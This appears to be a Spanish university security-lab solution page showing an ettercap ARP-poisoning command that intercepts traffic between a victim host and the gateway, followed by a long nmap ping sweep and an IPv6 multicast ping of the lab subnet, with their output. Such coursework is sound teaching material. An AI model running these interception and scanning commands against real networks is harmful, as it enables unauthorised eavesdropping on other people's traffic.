# PRÁCTICA 2 - EJEMPLOS DE CATEGORÍAS DE ATAQUE ET AL (SOLUCIÓN)

En esta segunda parte se muestran las soluciones a la primera práctica. En [`p2-sesiones`](./p2-sesiones.md) se mostrarán los apuntes tomados durante las sesiones.

```bash
root@debian:/home/lsi# ettercap -T -q -i ens33 -M arp:remote //10.11.49.146/ //10.11.48.1/ -w ficherito

ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
 ens33 -> 00:50:56:97:D5:D9
	  10.11.48.50/255.255.254.0
	  fe80::250:56ff:fe97:d5d9/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
28230 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Scanning for merged targets (2 hosts)...

* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 10.11.49.146 00:50:56:97:DE:D1

 GROUP 2 : 10.11.48.1 DC:08:56:10:84:B9
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help

```

```bash
root@debian:/home/lsi# nmap -sP 10.11.48.0/23
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-30 17:12 CET
Nmap scan report for 10.11.48.1
Host is up (0.00061s latency).
MAC Address: DC:08:56:10:84:B9 (Alcatel-Lucent Enterprise)
Nmap scan report for 10.11.48.2
Host is up (0.00063s latency).
MAC Address: 00:50:56:97:B5:D6 (VMware)
Nmap scan report for 10.11.48.3
Host is up (0.00038s latency).
MAC Address: 00:50:56:97:2C:BF (VMware)
Nmap scan report for 10.11.48.16
Host is up (0.00077s latency).
MAC Address: 00:50:56:97:2C:AD (VMware)
Nmap scan report for 10.11.48.17
Host is up (0.00033s latency).
MAC Address: 00:50:56:97:52:AF (VMware)
Nmap scan report for 10.11.48.18
Host is up (0.00072s latency).
MAC Address: 00:50:56:97:54:17 (VMware)
Nmap scan report for 10.11.48.20
Host is up (0.00073s latency).
MAC Address: 00:50:56:97:03:43 (VMware)
Nmap scan report for 10.11.48.22
Host is up (0.00070s latency).
MAC Address: 00:50:56:97:5A:A5 (VMware)
Nmap scan report for 10.11.48.24
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:6B:A6 (VMware)
Nmap scan report for 10.11.48.25
Host is up (0.00036s latency).
MAC Address: 00:50:56:97:11:58 (VMware)
Nmap scan report for 10.11.48.26
Host is up (0.00083s latency).
MAC Address: 00:50:56:97:11:BC (VMware)
Nmap scan report for 10.11.48.27
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:0C:15 (VMware)
Nmap scan report for 10.11.48.28
Host is up (0.0015s latency).
MAC Address: 00:50:56:97:B2:FD (VMware)
Nmap scan report for 10.11.48.29
Host is up (0.00033s latency).
MAC Address: 00:50:56:97:4D:3D (VMware)
Nmap scan report for 10.11.48.30
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:48:08 (VMware)
Nmap scan report for 10.11.48.31
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:59:93 (VMware)
Nmap scan report for 10.11.48.32
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:38:A4 (VMware)
Nmap scan report for 10.11.48.41
Host is up (0.00067s latency).
MAC Address: 00:50:56:97:E7:F9 (VMware)
Nmap scan report for 10.11.48.42
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:C2:B1 (VMware)
Nmap scan report for 10.11.48.43
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:34:99 (VMware)
Nmap scan report for 10.11.48.44
Host is up (0.00098s latency).
MAC Address: 00:50:56:97:D1:5B (VMware)
Nmap scan report for 10.11.48.45
Host is up (0.00043s latency).
MAC Address: 00:50:56:97:20:05 (VMware)
Nmap scan report for 10.11.48.46
Host is up (0.00076s latency).
MAC Address: 00:50:56:97:6D:78 (VMware)
Nmap scan report for 10.11.48.47
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:FD:C8 (VMware)
Nmap scan report for 10.11.48.48
Host is up (0.0016s latency).
MAC Address: 00:50:56:97:A0:4A (VMware)
Nmap scan report for 10.11.48.49
Host is up (0.00030s latency).
MAC Address: 00:50:56:97:3D:5B (VMware)
Nmap scan report for 10.11.48.51
Host is up (0.0053s latency).
MAC Address: 00:50:56:97:B1:0B (VMware)
Nmap scan report for 10.11.48.52
Host is up (0.00031s latency).
MAC Address: 00:50:56:97:4D:09 (VMware)
Nmap scan report for 10.11.48.67
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:45:DD (VMware)
Nmap scan report for 10.11.48.68
Host is up (0.00036s latency).
MAC Address: 00:50:56:97:3B:3B (VMware)
Nmap scan report for 10.11.48.69
Host is up (0.00064s latency).
MAC Address: 00:50:56:97:35:B3 (VMware)
Nmap scan report for 10.11.48.70
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:6D:5C (VMware)
Nmap scan report for 10.11.48.71
Host is up (0.00077s latency).
MAC Address: 00:50:56:97:0B:5A (VMware)
Nmap scan report for 10.11.48.72
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:2D:42 (VMware)
Nmap scan report for 10.11.48.73
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:A1:04 (VMware)
Nmap scan report for 10.11.48.74
Host is up (0.00033s latency).
MAC Address: 00:50:56:97:94:AB (VMware)
Nmap scan report for 10.11.48.75
Host is up (0.00071s latency).
MAC Address: 00:50:56:97:4D:2F (VMware)
Nmap scan report for 10.11.48.76
Host is up (0.00060s latency).
MAC Address: 00:50:56:97:71:72 (VMware)
Nmap scan report for 10.11.48.77
Host is up (0.0013s latency).
MAC Address: 00:50:56:97:77:5B (VMware)
Nmap scan report for 10.11.48.78
Host is up (0.00060s latency).
MAC Address: 00:50:56:97:2C:99 (VMware)
Nmap scan report for 10.11.48.91
Host is up (0.00064s latency).
MAC Address: 00:50:56:97:98:7C (VMware)
Nmap scan report for 10.11.48.92
Host is up (0.0025s latency).
MAC Address: 00:50:56:97:2A:56 (VMware)
Nmap scan report for 10.11.48.93
Host is up (0.0014s latency).
MAC Address: 00:50:56:97:66:92 (VMware)
Nmap scan report for 10.11.48.94
Host is up (0.00031s latency).
MAC Address: 00:50:56:97:60:D0 (VMware)
Nmap scan report for 10.11.48.95
Host is up (0.00078s latency).
MAC Address: 00:50:56:97:FF:B9 (VMware)
Nmap scan report for 10.11.48.97
Host is up (0.00077s latency).
MAC Address: 00:50:56:97:25:61 (VMware)
Nmap scan report for 10.11.48.98
Host is up (0.00076s latency).
MAC Address: 00:50:56:97:53:DD (VMware)
Nmap scan report for 10.11.48.99
Host is up (0.00070s latency).
MAC Address: 00:50:56:97:70:AC (VMware)
Nmap scan report for 10.11.48.100
Host is up (0.00069s latency).
MAC Address: 00:50:56:97:A0:D5 (VMware)
Nmap scan report for 10.11.48.101
Host is up (0.00040s latency).
MAC Address: 00:50:56:97:EE:5B (VMware)
Nmap scan report for 10.11.48.102
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:03:80 (VMware)
Nmap scan report for 10.11.48.114
Host is up (0.00066s latency).
MAC Address: 00:50:56:97:80:9B (VMware)
Nmap scan report for 10.11.48.115
Host is up (0.00081s latency).
MAC Address: 00:50:56:97:F8:13 (VMware)
Nmap scan report for 10.11.48.116
Host is up (0.00077s latency).
MAC Address: 00:50:56:97:C2:E4 (VMware)
Nmap scan report for 10.11.48.117
Host is up (0.00069s latency).
MAC Address: 00:50:56:97:09:AC (VMware)
Nmap scan report for 10.11.48.118
Host is up (0.00045s latency).
MAC Address: 00:50:56:97:4E:A5 (VMware)
Nmap scan report for 10.11.48.119
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:E2:F6 (VMware)
Nmap scan report for 10.11.48.121
Host is up (0.00099s latency).
MAC Address: 00:50:56:97:2F:8C (VMware)
Nmap scan report for 10.11.48.122
Host is up (0.00076s latency).
MAC Address: 00:50:56:97:7B:AB (VMware)
Nmap scan report for 10.11.48.123
Host is up (0.0036s latency).
MAC Address: 00:50:56:97:51:C9 (VMware)
Nmap scan report for 10.11.48.124
Host is up (0.00066s latency).
MAC Address: 00:50:56:97:D0:47 (VMware)
Nmap scan report for 10.11.48.125
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:30:26 (VMware)
Nmap scan report for 10.11.48.126
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:33:EA (VMware)
Nmap scan report for 10.11.48.127
Host is up (0.00036s latency).
MAC Address: 00:50:56:97:25:9F (VMware)
Nmap scan report for 10.11.48.128
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:3B:D6 (VMware)
Nmap scan report for 10.11.48.129
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:24:93 (VMware)
Nmap scan report for 10.11.48.141
Host is up (0.00065s latency).
MAC Address: 00:50:56:97:80:7F (VMware)
Nmap scan report for 10.11.48.142
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:D1:1D (VMware)
Nmap scan report for 10.11.48.143
Host is up (0.00057s latency).
MAC Address: 00:50:56:97:62:B2 (VMware)
Nmap scan report for 10.11.48.144
Host is up (0.0016s latency).
MAC Address: 00:50:56:97:6B:BB (VMware)
Nmap scan report for 10.11.48.146
Host is up (0.00075s latency).
MAC Address: 00:50:56:97:CD:AB (VMware)
Nmap scan report for 10.11.48.147
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:29:3A (VMware)
Nmap scan report for 10.11.48.148
Host is up (0.00055s latency).
MAC Address: 00:50:56:97:0B:13 (VMware)
Nmap scan report for 10.11.48.149
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:11:4A (VMware)
Nmap scan report for 10.11.48.150
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:BE:4B (VMware)
Nmap scan report for 10.11.48.151
Host is up (0.00057s latency).
MAC Address: 00:50:56:97:D1:A4 (VMware)
Nmap scan report for 10.11.48.152
Host is up (0.00078s latency).
MAC Address: 00:50:56:97:AA:04 (VMware)
Nmap scan report for 10.11.48.153
Host is up (0.00066s latency).
MAC Address: 00:50:56:97:31:FD (VMware)
Nmap scan report for 10.11.48.155
Host is up (0.00099s latency).
MAC Address: 00:50:56:97:F3:E5 (VMware)
Nmap scan report for 10.11.48.156
Host is up (0.00095s latency).
MAC Address: 00:50:56:97:6A:6A (VMware)
Nmap scan report for 10.11.48.165
Host is up (0.00047s latency).
MAC Address: 00:50:56:97:95:FF (VMware)
Nmap scan report for 10.11.48.166
Host is up (0.00045s latency).
MAC Address: 00:50:56:97:29:F0 (VMware)
Nmap scan report for 10.11.48.167
Host is up (0.00055s latency).
MAC Address: 00:50:56:97:B2:0E (VMware)
Nmap scan report for 10.11.48.168
Host is up (0.00052s latency).
MAC Address: 00:50:56:97:BB:A5 (VMware)
Nmap scan report for 10.11.48.170
Host is up (0.00060s latency).
MAC Address: 00:50:56:97:D6:7E (VMware)
Nmap scan report for 10.11.48.171
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:F7:4F (VMware)
Nmap scan report for 10.11.48.172
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:89:C5 (VMware)
Nmap scan report for 10.11.48.173
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:0A:6A (VMware)
Nmap scan report for 10.11.48.174
Host is up (0.00070s latency).
MAC Address: 00:50:56:97:5F:22 (VMware)
Nmap scan report for 10.11.48.189
Host is up (0.00071s latency).
MAC Address: 00:50:56:97:27:98 (VMware)
Nmap scan report for 10.11.48.190
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:09:B6 (VMware)
Nmap scan report for 10.11.49.16
Host is up (0.00082s latency).
MAC Address: 00:50:56:97:03:8F (VMware)
Nmap scan report for 10.11.49.17
Host is up (0.00040s latency).
MAC Address: 00:50:56:97:F6:06 (VMware)
Nmap scan report for 10.11.49.18
Host is up (0.00072s latency).
MAC Address: 00:50:56:97:EE:84 (VMware)
Nmap scan report for 10.11.49.19
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:AC:5E (VMware)
Nmap scan report for 10.11.49.20
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:A3:7C (VMware)
Nmap scan report for 10.11.49.21
Host is up (0.00077s latency).
MAC Address: 00:50:56:97:52:62 (VMware)
Nmap scan report for 10.11.49.22
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:58:46 (VMware)
Nmap scan report for 10.11.49.23
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:00:22 (VMware)
Nmap scan report for 10.11.49.24
Host is up (0.00046s latency).
MAC Address: 00:50:56:97:32:D5 (VMware)
Nmap scan report for 10.11.49.25
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:D0:A2 (VMware)
Nmap scan report for 10.11.49.26
Host is up (0.00044s latency).
MAC Address: 00:50:56:97:88:37 (VMware)
Nmap scan report for 10.11.49.27
Host is up (0.00035s latency).
MAC Address: 00:50:56:97:C4:BA (VMware)
Nmap scan report for 10.11.49.28
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:5B:23 (VMware)
Nmap scan report for 10.11.49.29
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:32:71 (VMware)
Nmap scan report for 10.11.49.30
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:66:05 (VMware)
Nmap scan report for 10.11.49.41
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:FA:F7 (VMware)
Nmap scan report for 10.11.49.42
Host is up (0.00070s latency).
MAC Address: 00:50:56:97:1B:89 (VMware)
Nmap scan report for 10.11.49.44
Host is up (0.00040s latency).
MAC Address: 00:50:56:97:29:F2 (VMware)
Nmap scan report for 10.11.49.45
Host is up (0.00067s latency).
MAC Address: 00:50:56:97:B0:96 (VMware)
Nmap scan report for 10.11.49.46
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:B9:F7 (VMware)
Nmap scan report for 10.11.49.47
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:49:65 (VMware)
Nmap scan report for 10.11.49.48
Host is up (0.00075s latency).
MAC Address: 00:50:56:97:98:1B (VMware)
Nmap scan report for 10.11.49.49
Host is up (0.00035s latency).
MAC Address: 00:50:56:97:3E:F2 (VMware)
Nmap scan report for 10.11.49.50
Host is up (0.00072s latency).
MAC Address: 00:50:56:97:D1:E1 (VMware)
Nmap scan report for 10.11.49.51
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:0C:41 (VMware)
Nmap scan report for 10.11.49.52
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:E9:89 (VMware)
Nmap scan report for 10.11.49.53
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:53:D9 (VMware)
Nmap scan report for 10.11.49.55
Host is up (0.00032s latency).
MAC Address: 00:50:56:97:8C:07 (VMware)
Nmap scan report for 10.11.49.56
Host is up (0.00038s latency).
MAC Address: 00:50:56:97:BA:37 (VMware)
Nmap scan report for 10.11.49.57
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:81:49 (VMware)
Nmap scan report for 10.11.49.58
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:65:D7 (VMware)
Nmap scan report for 10.11.49.66
Host is up (0.0030s latency).
MAC Address: 00:50:56:97:FF:AC (VMware)
Nmap scan report for 10.11.49.67
Host is up (0.00071s latency).
MAC Address: 00:50:56:97:CE:93 (VMware)
Nmap scan report for 10.11.49.68
Host is up (0.00033s latency).
MAC Address: 00:50:56:97:91:B6 (VMware)
Nmap scan report for 10.11.49.69
Host is up (0.00084s latency).
MAC Address: 00:50:56:97:2D:96 (VMware)
Nmap scan report for 10.11.49.70
Host is up (0.00073s latency).
MAC Address: 00:50:56:97:34:0F (VMware)
Nmap scan report for 10.11.49.71
Host is up (0.00080s latency).
MAC Address: 00:50:56:97:16:9C (VMware)
Nmap scan report for 10.11.49.72
Host is up (0.00069s latency).
MAC Address: 00:50:56:97:2B:61 (VMware)
Nmap scan report for 10.11.49.73
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:95:15 (VMware)
Nmap scan report for 10.11.49.74
Host is up (0.00070s latency).
MAC Address: 00:50:56:97:06:3A (VMware)
Nmap scan report for 10.11.49.75
Host is up (0.00032s latency).
MAC Address: 00:50:56:97:E5:34 (VMware)
Nmap scan report for 10.11.49.76
Host is up (0.0041s latency).
MAC Address: 00:50:56:97:C3:7A (VMware)
Nmap scan report for 10.11.49.77
Host is up (0.00033s latency).
MAC Address: 00:50:56:97:2A:D7 (VMware)
Nmap scan report for 10.11.49.78
Host is up (0.00067s latency).
MAC Address: 00:50:56:97:2A:5E (VMware)
Nmap scan report for 10.11.49.91
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:7F:95 (VMware)
Nmap scan report for 10.11.49.92
Host is up (0.00065s latency).
MAC Address: 00:50:56:97:FD:2C (VMware)
Nmap scan report for 10.11.49.95
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:B5:D6 (VMware)
Nmap scan report for 10.11.49.96
Host is up (0.00066s latency).
MAC Address: 00:50:56:97:2C:BF (VMware)
Nmap scan report for 10.11.49.97
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:6A:E0 (VMware)
Nmap scan report for 10.11.49.98
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:49:66 (VMware)
Nmap scan report for 10.11.49.99
Host is up (0.00040s latency).
MAC Address: 00:50:56:97:14:32 (VMware)
Nmap scan report for 10.11.49.100
Host is up (0.0013s latency).
MAC Address: 00:50:56:97:C2:2E (VMware)
Nmap scan report for 10.11.49.101
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:52:36 (VMware)
Nmap scan report for 10.11.49.102
Host is up (0.0014s latency).
MAC Address: 00:50:56:97:84:15 (VMware)
Nmap scan report for 10.11.49.103
Host is up (0.00070s latency).
MAC Address: 00:50:56:97:6E:46 (VMware)
Nmap scan report for 10.11.49.104
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:B6:4A (VMware)
Nmap scan report for 10.11.49.105
Host is up (0.00075s latency).
MAC Address: 00:50:56:97:F2:13 (VMware)
Nmap scan report for 10.11.49.106
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:24:D0 (VMware)
Nmap scan report for 10.11.49.116
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:FB:05 (VMware)
Nmap scan report for 10.11.49.117
Host is up (0.00078s latency).
MAC Address: 00:50:56:97:BA:BB (VMware)
Nmap scan report for 10.11.49.118
Host is up (0.00096s latency).
MAC Address: 00:50:56:97:8C:DC (VMware)
Nmap scan report for 10.11.49.119
Host is up (0.00064s latency).
MAC Address: 00:50:56:97:71:B2 (VMware)
Nmap scan report for 10.11.49.120
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:A3:5F (VMware)
Nmap scan report for 10.11.49.121
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:0C:1B (VMware)
Nmap scan report for 10.11.49.123
Host is up (0.00069s latency).
MAC Address: 00:50:56:97:15:62 (VMware)
Nmap scan report for 10.11.49.124
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:86:AA (VMware)
Nmap scan report for 10.11.49.125
Host is up (0.0018s latency).
MAC Address: 00:50:56:97:68:EA (VMware)
Nmap scan report for 10.11.49.126
Host is up (0.00066s latency).
MAC Address: 00:50:56:97:97:C0 (VMware)
Nmap scan report for 10.11.49.127
Host is up (0.0014s latency).
MAC Address: 00:50:56:97:1A:26 (VMware)
Nmap scan report for 10.11.49.128
Host is up (0.00033s latency).
MAC Address: 00:50:56:97:1D:FD (VMware)
Nmap scan report for 10.11.49.129
Host is up (0.00059s latency).
MAC Address: 00:50:56:97:AF:A5 (VMware)
Nmap scan report for 10.11.49.130
Host is up (0.00053s latency).
MAC Address: 00:50:56:97:55:5E (VMware)
Nmap scan report for 10.11.49.141
Host is up (0.00060s latency).
MAC Address: 00:50:56:97:B0:55 (VMware)
Nmap scan report for 10.11.49.142
Host is up (0.00057s latency).
MAC Address: 00:50:56:97:94:82 (VMware)
Nmap scan report for 10.11.49.143
Host is up (0.00067s latency).
MAC Address: 00:50:56:97:4E:86 (VMware)
Nmap scan report for 10.11.49.144
Host is up (0.00066s latency).
MAC Address: 00:50:56:97:0E:8A (VMware)
Nmap scan report for 10.11.49.145
Host is up (0.0013s latency).
MAC Address: 00:50:56:97:1B:0E (VMware)
Nmap scan report for 10.11.49.146
Host is up (0.00058s latency).
MAC Address: 00:50:56:97:DE:D1 (VMware)
Nmap scan report for 10.11.49.147
Host is up (0.00063s latency).
MAC Address: 00:50:56:97:FE:B6 (VMware)
Nmap scan report for 10.11.49.148
Host is up (0.00061s latency).
MAC Address: 00:50:56:97:FB:C9 (VMware)
Nmap scan report for 10.11.49.149
Host is up (0.00056s latency).
MAC Address: 00:50:56:97:6B:35 (VMware)
Nmap scan report for 10.11.49.150
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:FC:95 (VMware)
Nmap scan report for 10.11.49.151
Host is up (0.00053s latency).
MAC Address: 00:50:56:97:41:A8 (VMware)
Nmap scan report for 10.11.49.152
Host is up (0.0014s latency).
MAC Address: 00:50:56:97:2C:14 (VMware)
Nmap scan report for 10.11.49.153
Host is up (0.00054s latency).
MAC Address: 00:50:56:97:3A:4A (VMware)
Nmap scan report for 10.11.49.154
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:AC:D0 (VMware)
Nmap scan report for 10.11.49.165
Host is up (0.00053s latency).
MAC Address: 00:50:56:97:BD:3F (VMware)
Nmap scan report for debian (10.11.48.50)
Host is up.
Nmap done: 512 IP addresses (179 hosts up) scanned in 6.81 seconds
```

```bash
root@debian:/home/lsi# ping6 -c2 -I ens33 ff02::1
ping6: Warning: source address might be selected on device other than: ens33
PING ff02::1(ff02::1) from :: ens33: 56 data bytes
64 bytes from fe80::250:56ff:fe97:d5d9%ens33: icmp_seq=1 ttl=64 time=0.101 ms
64 bytes from fe80::250:56ff:fe97:a35f%ens33: icmp_seq=1 ttl=64 time=0.639 ms
64 bytes from fe80::250:56ff:fe97:1dfd%ens33: icmp_seq=1 ttl=64 time=0.650 ms
64 bytes from fe80::250:56ff:fe97:809b%ens33: icmp_seq=1 ttl=64 time=0.847 ms
64 bytes from fe80::250:56ff:fe97:ffac%ens33: icmp_seq=1 ttl=64 time=0.896 ms
64 bytes from fe80::250:56ff:fe97:94ab%ens33: icmp_seq=1 ttl=64 time=1.03 ms
64 bytes from fe80::250:56ff:fe97:5aa5%ens33: icmp_seq=1 ttl=64 time=1.32 ms
64 bytes from fe80::250:56ff:fe97:60d0%ens33: icmp_seq=1 ttl=64 time=1.33 ms
64 bytes from fe80::250:56ff:fe97:3026%ens33: icmp_seq=1 ttl=64 time=1.42 ms
64 bytes from fe80::250:56ff:fe97:a6a%ens33: icmp_seq=1 ttl=64 time=1.43 ms
64 bytes from fe80::250:56ff:fe97:52af%ens33: icmp_seq=1 ttl=64 time=1.44 ms
64 bytes from fe80::250:56ff:fe97:91b6%ens33: icmp_seq=1 ttl=64 time=1.44 ms
64 bytes from fe80::250:56ff:fe97:70ac%ens33: icmp_seq=1 ttl=64 time=1.53 ms
64 bytes from fe80::250:56ff:fe97:3499%ens33: icmp_seq=1 ttl=64 time=1.53 ms
64 bytes from fe80::250:56ff:fe97:2c99%ens33: icmp_seq=1 ttl=64 time=1.55 ms
64 bytes from fe80::250:56ff:fe97:7172%ens33: icmp_seq=1 ttl=64 time=1.56 ms
64 bytes from fe80::250:56ff:fe97:95ff%ens33: icmp_seq=1 ttl=64 time=1.57 ms
64 bytes from fe80::250:56ff:fe97:41a8%ens33: icmp_seq=1 ttl=64 time=1.61 ms
64 bytes from fe80::250:56ff:fe97:5846%ens33: icmp_seq=1 ttl=64 time=1.61 ms
64 bytes from fe80::250:56ff:fe97:2005%ens33: icmp_seq=1 ttl=64 time=1.62 ms
64 bytes from fe80::250:56ff:fe97:63a%ens33: icmp_seq=1 ttl=64 time=1.62 ms
64 bytes from fe80::250:56ff:fe97:2d96%ens33: icmp_seq=1 ttl=64 time=1.74 ms
64 bytes from fe80::250:56ff:fe97:fbc9%ens33: icmp_seq=1 ttl=64 time=1.74 ms
64 bytes from fe80::250:56ff:fe97:babb%ens33: icmp_seq=1 ttl=64 time=1.75 ms
64 bytes from fe80::250:56ff:fe97:169c%ens33: icmp_seq=1 ttl=64 time=1.79 ms
64 bytes from fe80::250:56ff:fe97:31fd%ens33: icmp_seq=1 ttl=64 time=1.80 ms
64 bytes from fe80::250:56ff:fe97:ce93%ens33: icmp_seq=1 ttl=64 time=1.90 ms
64 bytes from fe80::250:56ff:fe97:1158%ens33: icmp_seq=1 ttl=64 time=1.91 ms
64 bytes from fe80::250:56ff:fe97:2c14%ens33: icmp_seq=1 ttl=64 time=1.97 ms
64 bytes from fe80::250:56ff:fe97:555e%ens33: icmp_seq=1 ttl=64 time=2.01 ms
64 bytes from fe80::250:56ff:fe97:d1a4%ens33: icmp_seq=1 ttl=64 time=2.02 ms
64 bytes from fe80::250:56ff:fe97:5236%ens33: icmp_seq=1 ttl=64 time=2.03 ms
64 bytes from fe80::250:56ff:fe97:807f%ens33: icmp_seq=1 ttl=64 time=2.03 ms
64 bytes from fe80::250:56ff:fe97:b20e%ens33: icmp_seq=1 ttl=64 time=2.11 ms
64 bytes from fe80::250:56ff:fe97:fb05%ens33: icmp_seq=1 ttl=64 time=2.11 ms
64 bytes from fe80::250:56ff:fe97:2b61%ens33: icmp_seq=1 ttl=64 time=2.16 ms
64 bytes from fe80::250:56ff:fe97:2ad7%ens33: icmp_seq=1 ttl=64 time=2.17 ms
64 bytes from fe80::250:56ff:fe97:29f0%ens33: icmp_seq=1 ttl=64 time=2.17 ms
64 bytes from fe80::250:56ff:fe97:e8a%ens33: icmp_seq=1 ttl=64 time=2.18 ms
64 bytes from fe80::250:56ff:fe97:c41%ens33: icmp_seq=1 ttl=64 time=2.18 ms
64 bytes from fe80::250:56ff:fe97:6d5c%ens33: icmp_seq=1 ttl=64 time=2.18 ms
64 bytes from fe80::250:56ff:fe97:c22e%ens33: icmp_seq=1 ttl=64 time=2.23 ms
64 bytes from fe80::250:56ff:fe97:9482%ens33: icmp_seq=1 ttl=64 time=2.23 ms
64 bytes from fe80::250:56ff:fe97:b13%ens33: icmp_seq=1 ttl=64 time=2.24 ms
64 bytes from fe80::250:56ff:fe97:ffb9%ens33: icmp_seq=1 ttl=64 time=2.24 ms
64 bytes from fe80::250:56ff:fe97:6605%ens33: icmp_seq=1 ttl=64 time=2.24 ms
64 bytes from fe80::250:56ff:fe97:2119%ens33: icmp_seq=1 ttl=64 time=2.24 ms
64 bytes from fe80::250:56ff:fe97:9515%ens33: icmp_seq=1 ttl=64 time=2.29 ms
64 bytes from fe80::250:56ff:fe97:ee84%ens33: icmp_seq=1 ttl=64 time=2.30 ms
64 bytes from fe80::250:56ff:fe97:6692%ens33: icmp_seq=1 ttl=64 time=2.30 ms
64 bytes from fe80::250:56ff:fe97:3d5b%ens33: icmp_seq=1 ttl=64 time=2.38 ms
64 bytes from fe80::250:56ff:fe97:e2f6%ens33: icmp_seq=1 ttl=64 time=2.38 ms
64 bytes from fe80::250:56ff:fe97:7a37%ens33: icmp_seq=1 ttl=64 time=2.39 ms
64 bytes from fe80::250:56ff:fe97:7bab%ens33: icmp_seq=1 ttl=64 time=2.39 ms
64 bytes from fe80::250:56ff:fe97:343%ens33: icmp_seq=1 ttl=64 time=2.46 ms
64 bytes from fe80::250:56ff:fe97:faf7%ens33: icmp_seq=1 ttl=64 time=2.46 ms
64 bytes from fe80::250:56ff:fe97:6ba6%ens33: icmp_seq=1 ttl=64 time=2.46 ms
64 bytes from fe80::250:56ff:fe97:ded1%ens33: icmp_seq=1 ttl=64 time=2.52 ms
64 bytes from fe80::250:56ff:fe97:2493%ens33: icmp_seq=1 ttl=64 time=2.60 ms
64 bytes from fe80::250:56ff:fe97:c2e4%ens33: icmp_seq=1 ttl=64 time=2.60 ms
64 bytes from fe80::250:56ff:fe97:e534%ens33: icmp_seq=1 ttl=64 time=2.61 ms
64 bytes from fe80::250:56ff:fe97:b64a%ens33: icmp_seq=1 ttl=64 time=2.61 ms
64 bytes from fe80::250:56ff:fe97:981b%ens33: icmp_seq=1 ttl=64 time=2.61 ms
64 bytes from fe80::250:56ff:fe97:89c5%ens33: icmp_seq=1 ttl=64 time=2.61 ms
64 bytes from fe80::250:56ff:fe97:24d0%ens33: icmp_seq=1 ttl=64 time=2.61 ms
64 bytes from fe80::250:56ff:fe97:c2b1%ens33: icmp_seq=1 ttl=64 time=2.62 ms
64 bytes from fe80::250:56ff:fe97:35b3%ens33: icmp_seq=1 ttl=64 time=2.62 ms
64 bytes from fe80::250:56ff:fe97:d1e1%ens33: icmp_seq=1 ttl=64 time=2.65 ms
64 bytes from fe80::250:56ff:fe97:ac5e%ens33: icmp_seq=1 ttl=64 time=2.66 ms
64 bytes from fe80::250:56ff:fe97:2f8c%ens33: icmp_seq=1 ttl=64 time=2.68 ms
64 bytes from fe80::250:56ff:fe97:be4b%ens33: icmp_seq=1 ttl=64 time=2.68 ms
64 bytes from fe80::250:56ff:fe97:380%ens33: icmp_seq=1 ttl=64 time=2.70 ms
64 bytes from fe80::250:56ff:fe97:6e46%ens33: icmp_seq=1 ttl=64 time=2.72 ms
64 bytes from fe80::250:56ff:fe97:68ea%ens33: icmp_seq=1 ttl=64 time=2.72 ms
64 bytes from fe80::250:56ff:fe97:9b6%ens33: icmp_seq=1 ttl=64 time=2.73 ms
64 bytes from fe80::250:56ff:fe97:3271%ens33: icmp_seq=1 ttl=64 time=2.74 ms
64 bytes from fe80::250:56ff:fe97:a0d5%ens33: icmp_seq=1 ttl=64 time=2.74 ms
64 bytes from fe80::250:56ff:fe97:d0a2%ens33: icmp_seq=1 ttl=64 time=2.74 ms
